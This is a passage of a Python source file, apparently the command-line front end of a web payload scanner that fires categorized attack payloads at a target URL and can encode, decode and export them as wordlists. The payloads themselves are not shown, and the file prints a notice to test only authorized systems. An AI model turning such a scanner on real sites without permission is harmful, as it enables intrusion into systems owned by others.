    scan_group = parser.add_argument_group("Scan Options")
    scan_group.add_argument("-u", "--url", help="Target URL (include parameters)")
    scan_group.add_argument("-m", "--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    scan_group.add_argument("-d", "--data", help="POST body (key=val&key2=val2)")
    scan_group.add_argument("-c", "--categories", nargs="+", help="Payload categories to use")
    scan_group.add_argument("--delay", type=float, default=0, help="Delay between requests (seconds)")
    scan_group.add_argument("--timeout", type=int, default=10, help="Request timeout (seconds)")
    scan_group.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    scan_group.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    scan_group.add_argument("-H", "--header", action="append", dest="headers", help="Custom header (Key: Value)")
    scan_group.add_argument("--cookie", action="append", dest="cookies", help="Cookie (name=value)")
    scan_group.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    scan_group.add_argument("-o", "--output", help="Save JSON report to file")

    # Decode / encode mode
    codec_group = parser.add_argument_group("Encode / Decode Options")
    codec_group.add_argument("--decode", metavar="PAYLOAD", help="Decode a payload")
    codec_group.add_argument("--decode-method", metavar="METHOD", help="Decoding method (url, base64, html_entity, unicode_escape)")
    codec_group.add_argument("--encode", metavar="PAYLOAD", help="Encode a payload")
    codec_group.add_argument("--encode-method", metavar="METHOD", help="Encoding method (url, base64, html_entity, ...)")

    # Wordlist generation
    gen_group = parser.add_argument_group("Wordlist Generation")
    gen_group.add_argument("--generate", action="store_true", help="Generate payload wordlist")
    gen_group.add_argument("--category", help="Specific category for wordlist")
    gen_group.add_argument("--limit", type=int, help="Max number of payloads")

    # Info
    parser.add_argument("--list-categories", action="store_true", help="List all payload categories")
    parser.add_argument("--list-encodings", action="store_true", help="List all encoding methods")

    return parser


def main():
    banner()
    parser = build_parser()
    args = parser.parse_args()

    # ── List categories ──────────────────────────────────────────
    if args.list_categories:
        cats = PayloadLibrary.list_categories()
        print(f"{C.BOLD}Available Payload Categories ({len(cats)}):{C.RESET}\n")
        for cat in cats:
            count = len(PayloadLibrary.get_by_category(cat))
            print(f"  {C.CYAN}{cat:<25}{C.RESET} ({count} payloads)")
        print()
        return

    # ── List encodings ───────────────────────────────────────────
    if args.list_encodings:
        print(f"{C.BOLD}Available Encoding Methods:{C.RESET}\n")
        for key, (name, _) in EncoderDecoder.ENCODING_MAP.items():
            print(f"  {C.CYAN}{key:<20}{C.RESET} {name}")
        print(f"\n{C.BOLD}Available Decoding Methods:{C.RESET}\n")
        for key, (name, _) in EncoderDecoder.DECODING_MAP.items():
            print(f"  {C.CYAN}{key:<20}{C.RESET} {name}")
        print()
        return

    # ── Decode mode ──────────────────────────────────────────────
    if args.decode:
        run_decode(args.decode, args.decode_method)
        return

    # ── Encode mode ──────────────────────────────────────────────
    if args.encode:
        run_encode(args.encode, args.encode_method)
        return

    # ── Generate wordlist ────────────────────────────────────────
    if args.generate:
        run_generate(
            category=args.category,
            encode=args.encode_method,
            limit=args.limit,
            output_file=args.output,
        )
        return

    # ── Scan mode ────────────────────────────────────────────────
    if not args.url:
        parser.print_help()
        sys.exit(0)

    print(f"{C.BOLD}[*] Target  :{C.RESET} {args.url}")
    print(f"{C.BOLD}[*] Method  :{C.RESET} {args.method}")
    print(f"{C.BOLD}[*] Proxy   :{C.RESET} {args.proxy or 'None'}")
    print(f"{C.BOLD}[*] Delay   :{C.RESET} {args.delay}s\n")

    # Disclaimer
    print(f"{C.RED}{C.BOLD}[!] LEGAL NOTICE: Only test systems you are authorized to test.{C.RESET}\n")

    post_data = None
    if args.data:
        post_data = dict(urllib.parse.parse_qsl(args.data))

    result = scan(
        url=args.url,
        categories=args.categories,
        delay=args.delay,
        timeout=args.timeout,
        proxy=args.proxy,
        verify_ssl=not args.no_verify,
        headers=args.headers,
        cookies=args.cookies,
        method=args.method,
        post_data=post_data,
        verbose=args.verbose,
    )

    print_report(result, output_file=args.output)


if __name__ == "__main__":
    main()
